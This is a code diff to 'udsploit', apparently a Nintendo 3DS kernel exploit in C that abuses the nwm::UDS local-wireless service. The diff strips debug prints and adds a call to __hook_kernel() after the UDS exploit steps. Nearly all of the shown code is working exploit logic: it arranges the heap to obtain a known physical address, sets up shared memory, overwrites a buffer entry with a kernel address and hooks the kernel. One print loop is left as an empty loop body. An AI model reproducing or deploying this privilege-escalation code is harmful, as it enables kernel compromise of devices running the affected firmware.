@@ -4,6 +4,8 @@
 
 #include <3ds.h>
 
+#include "udsploit.h"
+
 // TEMP, so that we can still allocate memory; this is only needed to run in a 3dsx obviously
 extern char* fake_heap_start;
 extern char* fake_heap_end;
@@ -123,12 +125,10 @@ Result allocHeapWithLa(u32 va, u32 size, u32* la)
 	u32 linear_addr = 0;
 
 	// allocate linear buffer as big as target buffer
-	printf("allocate linear buffer as big as target buffer\n");
 	ret = svcControlMemory((u32*)&linear_addr, 0, 0, size, 0x10003, 0x3);
 	if(ret) return ret;
 
 	// figure out how much memory is available
-	printf("figure out how much memory is available\n");
 	s64 tmp = 0;
 	ret = svcGetSystemInfo(&tmp, 0, 1);
 	if(ret) return ret;
@@ -136,22 +136,18 @@ Result allocHeapWithLa(u32 va, u32 size, u32* la)
 	printf("%08X\n", (unsigned int)placeholder_size);
 
 	// allocate placeholder to cover all free memory
-	printf("allocate placeholder to cover all free memory\n");
 	ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 3, 3);
 	if(ret) return ret;
 
 	// free linear block
-	printf("free linear block\n");
 	ret = svcControlMemory((u32*)&linear_addr, (u32)linear_addr, 0, size, 1, 0);
 	if(ret) return ret;
 
 	// allocate regular heap to replace it: we know its PA
-	printf("allocate regular heap to replace it\n");
 	ret = svcControlMemory((u32*)&va, (u32)va, 0, size, 3, 3);
 	if(ret) return ret;
 
 	// free placeholder memory
-	printf("free placeholder memory\n");
 	ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 1, 0);
 	if(ret) return ret;
 
@@ -170,16 +166,13 @@ Result udsploit()
 	Handle sharedmem_handle = 0;
 	u32 sharedmem_va = 0x0dead000, sharedmem_la = 0;
 
-	printf("udsploit: srvGetServiceHandle\n");
 	ret = srvGetServiceHandle(&udsHandle, "nwm::UDS");
 	if(ret) goto fail;
 
-	printf("udsploit: srvGetServiceHandle\n");
 	ret = srvGetServiceHandle(&ndmHandle, "ndm:u");
 	if(ret) goto fail;
 
 	{
-		printf("udsploit: allocHeapWithPa\n");
 		ret = allocHeapWithLa(sharedmem_va, sharedmem_size, &sharedmem_la);
 		if(ret)
 		{
@@ -187,28 +180,21 @@ Result udsploit()
 			goto fail;
 		}
 
-		printf("udsploit: sharedmem_la %08X\n", (unsigned int)sharedmem_la);
-
-		printf("udsploit: svcCreateMemoryBlock\n");
 		memset((void*)sharedmem_va, 0, sharedmem_size);
 		ret = svcCreateMemoryBlock(&sharedmem_handle, (u32)sharedmem_va, sharedmem_size, 0x0, MEMPERM_READ | MEMPERM_WRITE);
 		if(ret) goto fail;
 	}
 
-	printf("udsploit: NDM_EnterExclusiveState\n");
 	ret = NDM_EnterExclusiveState(&ndmHandle, 2); // EXCLUSIVE_STATE_LOCAL_COMMUNICATIONS
 	if(ret) goto fail;
 
-	printf("udsploit: UDS_InitializeWithVersion\n");
 	udsNodeInfo nodeinfo = {0};
 	ret = UDS_InitializeWithVersion(&udsHandle, &nodeinfo, sharedmem_handle, sharedmem_size);
 	if(ret) goto fail;
 
-	printf("udsploit: NDM_LeaveExclusiveState\n");
 	ret = NDM_LeaveExclusiveState(&ndmHandle);
 	if(ret) goto fail;
 
-	printf("udsploit: UDS_Bind\n");
 	u32 BindNodeID = 1;
 	ret = UDS_Bind(&udsHandle, BindNodeID, 0xff0, 1, 0);
 	if(ret) goto fail;
@@ -223,7 +209,7 @@ Result udsploit()
 		svcSleepThread(1 * 1000 * 1000);
 
 		int i;
-		for(i = 0; i < 8; i++) printf("%08X %08X %08X %08X\n", buffer[i * 4 + 0], buffer[i * 4 + 1], buffer[i * 4 + 2], buffer[i * 4 + 3]);
+		for(i = 0; i < 8; i++);
 					
 		buffer[3] = 0x1EC40140 - 8;
 
@@ -234,8 +220,10 @@ Result udsploit()
 		linearFree(buffer);
 	}
 
-	printf("udsploit: UDS_Unbind\n");
 	ret = UDS_Unbind(&udsHandle, BindNodeID);
+	if(ret) goto fail;
+	
+	ret = __hook_kernel();
 	if(ret) goto fail;
 
 	fail:
